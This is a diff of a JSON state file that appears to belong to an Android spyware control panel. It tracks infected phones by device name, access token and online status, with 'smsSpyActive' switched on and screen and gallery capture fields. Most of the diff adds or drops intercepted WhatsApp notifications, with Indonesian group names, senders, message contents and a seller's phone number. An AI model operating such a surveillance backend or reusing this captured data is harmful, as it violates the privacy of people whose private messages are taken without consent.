@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781418142,
+    "lastSeen": 1776781421283,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2927 pesan dari 17 chat",
+        "time": "21/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781419569
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1026 pesan): Menyebut semua",
+        "content": "~ zunz: @⁨semua⁩",
+        "time": "21/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781419554
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB byone/mabar ff 8a: diga",
+        "content": "💟 Stiker",
+        "time": "21/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781419370
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (147 pesan): ~ OISHIX STORE REAL",
+        "content": "📷 650+ NO PAS COCOK BUAT RENTAL",
+        "time": "21/04 21:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781419292
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB1 ALDY BANYUMAS JATENG (53 pesan): ~ Lnzz",
@@ -10296,38 +10328,6 @@
         "time": "21/04 20:57",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779875711
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3646 pesan dari 21 chat",
-        "time": "21/04 20:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779874103
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (131 pesan): ~ jall store",
-        "content": "📷 𝗙𝗢𝗥𝗠𝗔𝗧 𝗝𝗣 𝗕𝗬 𝗝𝗔𝗟𝗟 𝗦𝗧𝗢𝗥𝗘\n[BUKAN PUNYA ADMIN]\n\n☎NOMOR SELLER :+6285713377298\n📦AKUN :ff\n💎SPEK : mamba old\n💸HARGA :60+\n⚙️LOG :ggl bind rebind tw koss \n🥷MC : 𝗝𝗔𝗟𝗟 𝗦𝗧𝗢𝗥𝗘\n\n𝗦𝗘𝗟𝗔𝗟𝗨 𝗠𝗘𝗡𝗚𝗚𝗨𝗡𝗔𝗞𝗔𝗡 𝗝𝗔𝗦𝗔 𝗔𝗗𝗠𝗜𝗡 [𝗝𝗔𝗟𝗟 𝗦𝗧𝗢𝗥𝗘] 𝗔𝗚𝗔𝗥 𝗧𝗘𝗥𝗛𝗜𝗡𝗗𝗔𝗥 𝗗𝗔𝗥𝗜 𝗥𝗜𝗣/𝗣𝗘𝗡𝗜𝗣𝗨𝗔𝗡‼️",
-        "time": "21/04 20:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779874000
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (83 pesan): Givano",
-        "content": "Nape",
-        "time": "21/04 20:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779873802
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || RULZ STORE KALBAR (691 pesan): ~ JB RENZ SMITH KALBAR",
-        "content": "📷 130K log bind refful",
-        "time": "21/04 20:57",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779873664
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781415024,
+    "lastSeen": 1776781422630,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781417382,
+    "lastSeen": 1776781420321,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
